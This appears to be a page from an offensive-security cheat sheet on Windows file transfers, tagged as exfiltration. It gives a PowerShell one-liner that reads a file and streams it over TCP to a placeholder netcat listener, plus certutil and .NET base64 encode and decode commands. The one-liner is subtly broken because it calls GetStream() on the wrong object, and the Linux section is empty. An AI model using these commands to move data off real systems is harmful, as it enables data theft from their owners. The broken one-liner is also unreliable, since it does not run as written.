---
layout: default
title: File Transfers
tags:
    - download
    - exfiltration
    - scp
    - smb
    - tftp
    - upload
---
# File Transfers
## Linux

## Windows
Powershell Send File to Netcat
```shell
$h="<host>";$p="<port>";$data=Get-Content -Path "<file>";$tcp=New-Object System.Net.Sockets.TcpClient($h,$p);$w=New-Object System.IO.StreamWriter($tcp).GetStream();foreach($l in $data){$w.WriteLine($l)};$w.Flush();$w.Close();$tcp.Close();
```

Base 64 Encoding
```shell
certutil -encode <input> <output>
[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("<UTF8 string>")) > <b64 output>
```

Base 64 Decoding
```shell
certutil -decode <input> <output>
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("<b64 string>")) > <UTF8 output>
```